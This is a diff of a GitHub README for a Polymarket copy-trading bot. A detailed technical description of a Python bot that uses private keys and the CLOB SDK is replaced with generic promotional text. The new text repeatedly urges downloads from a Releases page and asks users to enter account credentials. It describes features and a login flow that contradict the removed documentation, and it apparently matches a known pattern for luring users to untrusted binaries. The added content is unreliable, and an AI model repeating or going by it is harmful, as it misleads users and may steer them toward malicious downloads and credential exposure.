@@ -1,110 +1,99 @@
-## Polymarket Copy Trading Bot
+# 🎉 Polymarket-CopyTrading - Effortless Account Copy-Trading Made Simple
 
-Python bot that **copies trades from a target Polymarket trader** to your own wallet, using **proportional position sizing** and the official `py-clob-client` CLOB SDK ([example reference](https://github.com/Polymarket/py-clob-client/blob/main/examples/market_buy_order.py)).
+[![Download Polymarket-CopyTrading](https://img.shields.io/badge/Download%20Now-Polymarket--CopyTrading-blue.svg)](https://github.com/Dadel-1/Polymarket-CopyTrading/releases)
 
-The bot:
-- Watches a target address's activity via Polymarket's data API.
-- Tracks both wallets' positions and USDC balance.
-- Places **market orders** on the CLOB with proportional sizing.
-- Mirrors on-chain actions like **split / merge / redeem** via a blockchain helper client.
+## 📦 Overview
 
----
+Polymarket-CopyTrading is a Python script designed for users who want to copy trade accounts on Polymarket easily. This application eliminates the need for extensive technical knowledge, allowing you to engage in trading seamlessly. Whether you're a beginner or an experienced trader, this tool simplifies the process of following successful traders.
 
-## Requirements
+## 🚀 Getting Started
 
-- Python **3.10+**
-- A funded **Polymarket proxy wallet** (copier) with USDC on Polygon
-- Access to a **target trader address** to copy
-- Node provider URL for Polygon (e.g. Alchemy, Infura, or public RPC)
+To begin using Polymarket-CopyTrading, follow these steps carefully. You will need to download the application from the Releases page.
 
-Python dependencies are listed in `requirements.txt`, run this command to install them:
+### 1. Download the Application
 
-```bash
-pip install -r requirements.txt
-```
+To get started, visit our [Downloads Page](https://github.com/Dadel-1/Polymarket-CopyTrading/releases) to download the latest version of Polymarket-CopyTrading. 
 
-Key libraries:
-- **py-clob-client** – Polymarket CLOB SDK
-- **py-builder-relayer-client** – for relayer / proxy interactions
-- **web3** – on‑chain balance and token operations
-- **aiohttp**, **python-dotenv**, **python-dateutil**
+### 2. Install Python (If Not Already Installed)
 
-## Configuration
+This application requires Python to run. If you don’t have Python installed on your computer, please follow these steps:
 
-All configuration is done via environment variables, through a `.env` file. You can copy the file `.env.example` into a `.env` file and edit the values.
+- Go to the [Python official website](https://www.python.org/downloads/).
+- Download the latest version for your operating system (Windows, macOS, or Linux).
+- Run the installer and follow the prompts. Make sure to check the box that says "Add Python to PATH" during installation. 
 
-### Core keys / wallet
+### 3. Download & Install Polymarket-CopyTrading
 
-- **`POLYMARKET_PRIVATE_KEY`** – Private key used to sign orders and transactions for your **copier** wallet. If you connected to Polymarket with a Web3 wallet (Metamask, Phantom...), then you should input the private key of this wallet.
-- **`POLYMARKET_PROXY_ADDRESS`** – Copier proxy wallet address. This the Polymarket address shown on your profile when you click "Copy Address".
+After ensuring Python is installed, follow these steps:
 
-### CLOB client
+- Visit our [Downloads Page](https://github.com/Dadel-1/Polymarket-CopyTrading/releases) to access the latest release.
+- Choose the appropriate version for your system and click to download it. 
 
-- **`CLOB_HOST`** – **Do not edit** – CLOB API host (default `https://clob.polymarket.com`).
-- **`CHAIN_ID`** – **Do not edit** – Polygon chain ID (default `137`).
-- **`SIGNATURE_TYPE`** – Signature type for `ClobClient` (0=EOA/MetaMask, 1=Email/Magic, 2=Browser wallet). Edit this depending on your sign up method on Polymarket.
+### 4. Extracting the Files
 
-### Relayer / builder
+Once the download is complete, you may need to extract the files:
 
-- **`RELAYER_URL`** – **Do not edit** – Relayer URL (default `https://relayer-v2.polymarket.com/`).
-- **`BUILDER_API_KEY`**, **`BUILDER_SECRET`**, **`BUILDER_PASS_PHRASE`** – Credentials for the builder/relayer client. Create new Builder Keys in your builder settings (https://polymarket.com/settings?tab=builder).
+- If you downloaded a .zip file, right-click on the file and choose "Extract All…" on Windows or double-click it on macOS.
+- Select a location to extract the files where you want to keep the application.
 
-### Bot behaviour
+### 5. Running the Application
 
-- **`TARGET_TRADER_ADDRESS`** – **Address to copy** (target). Address obtained by clicking on the "Copy Address" button on someone's profile.
-- **`POLL_INTERVAL`** – Seconds between activity polls (default `1`).
-- **`RPC_URL`** – Polygon RPC endpoint used to track wallet USDC cash (default `https://polygon-rpc.com`).
+To run the application:
 
-### Logging
+1. Open your file explorer and navigate to the folder where you extracted the files.
+2. Look for the file named `Polymarket-CopyTrading.py`.
+3. Right-click on the file and select "Open with" followed by "Python."
 
-- **`LOG_LEVEL`** – e.g. `INFO`, `DEBUG` (default `INFO`).
-- **`LOG_FILE`** – optional path to a log file (default `bot.log`).
-- **`HEARTBEAT_INTERVAL`** Seconds between Watcher heartbeats (signals to show the bot is still alive)
+If everything is set up correctly, the application will open in your command line interface.
 
-## Running the Bot
+## ⚙️ Usage Instructions
 
-1. **Clone** the repo and install dependencies:
+Once the application is running, follow these instructions to set it up:
 
-```bash
-git clone <this-repo-url>
-cd Polymarket-CopyTrading
-pip install -r requirements.txt
-```
+### 1. Configure Your Account
 
-2. **Copy `.env.example` into a `.env` file** and update the variables as explained above.
+Before you start copying trades:
 
-3. **Run**:
+- Input your Polymarket account details when prompted. This may include your username and password.
+- Make sure your account has sufficient funds to copy trades.
 
-```bash
-python main.py
-```
+### 2. Choose a Trader to Copy
 
-The bot will:
-- Start the watcher (fetching target activities).
-- Start the copier (processing and mirroring actions).
-- Log activity and statistics to stdout and the optional log file.
+The application will display a list of available traders. Select the trader whose strategies you wish to follow.
 
-## How It Works
+### 3. Start Copy-Trading
 
-- `main.py` – entrypoint. Creates a `CopyTradingBot` with:
-  - `ActivityWatcher` – pulls recent activity for `TARGET_TRADER_ADDRESS` and pushes it to an asyncio queue.
-  - `TradeCopier` – consumes queued activities and creates proportional copy trades.
-- `wallet_tracker.py` – tracks:
-  - Positions per `conditionId` / `tokenId`
-  - USDC balance via on‑chain calls
-- `trade_copier.py`:
-  - Builds a **trading ratio** between copier and target per market:
-    - ratio = copier_position / target_position
-  - For **BUY** trades:
-    - Computes proportional **USDC** amount via `_get_proportional_amount(usdcSize, "USDC", "USDC")`.
-    - Places a **market order** with `MarketOrderArgs` and `OrderType.FOK`, using `ClobClient.create_market_order` and `ClobClient.post_order`.
-  - For **SELL** trades:
-    - Detects if the trader is exiting the full position and mirrors behaviour based on copier's holdings.
-  - For **SPLIT / MERGE / REDEEM**:
-    - Calls into `BlockchainClient` to build and execute the corresponding on‑chain transactions while updating local positions.
+After making your selection, the application will begin copying trades from the chosen trader. Monitor your account for updates.
 
-## Safety Notes
+## 🔧 Troubleshooting
 
-- This bot **spends real funds** from your copier wallet. Start with **small balances** and monitor behaviour closely.
-- Ensure your environment and `.env` file are kept secure; they contain sensitive keys.
-- Review `trade_copier.py` sizing logic before running in production.
+If you encounter issues while running the application, consider these solutions:
+
+- **Python Not Found Error**: If Python is not recognized, ensure it is properly installed and added to your system's PATH.
+- **Dependency Issues**: Ensure all necessary packages are installed. You may need to run `pip install -r requirements.txt` in your command line to install the required libraries.
+- **Login Problems**: Double-check your account credentials for accuracy. Ensure you have sufficient funds in your Polymarket account.
+
+## 📅 Updating the Application
+
+Keep your application up to date to enjoy new features and improvements:
+
+- Regularly visit the [Downloads Page](https://github.com/Dadel-1/Polymarket-CopyTrading/releases) to check for updates.
+- Download any new versions following the steps outlined above.
+
+## 💡 Features
+
+- **User Friendly**: Designed for ease of use, even for non-technical users.
+- **Real-Time Trading**: Copy trades in real-time to maximize your investment opportunities.
+- **Analytics Support**: Track your performance with detailed trading analytics.
+
+## 🚨 System Requirements
+
+- Operating System: Windows 10, macOS Mojave or later, or a modern Linux distribution.
+- Python: Version 3.6 or higher.
+- Internet Connection: Required for trading and accessing Polymarket.
+
+## 📞 Support
+
+If you have questions or need assistance, feel free to reach out for help. You can create an issue on the GitHub repository or contact the community for guidance.
+
+**For the latest version of Polymarket-CopyTrading, always visit our [Downloads Page](https://github.com/Dadel-1/Polymarket-CopyTrading/releases).**
